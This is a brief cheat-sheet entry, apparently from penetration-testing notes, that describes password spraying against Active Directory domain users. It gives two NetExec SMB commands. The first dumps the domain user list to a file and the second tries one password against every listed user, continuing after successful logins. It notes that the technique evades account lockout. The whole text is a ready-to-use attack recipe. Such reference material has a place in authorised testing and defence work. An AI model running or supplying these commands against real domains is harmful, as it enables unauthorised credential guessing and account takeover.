# Password Spray (Domain Users)

One password, every user — far less likely to trigger lockout than many passwords against one user.

```bash
nxc smb <DC_IP> -u <known-user> -p '<pass>' --users > users.txt   # dump userlist first
nxc smb <DC_IP> -u users.txt -p '<pass>' --continue-on-success
```
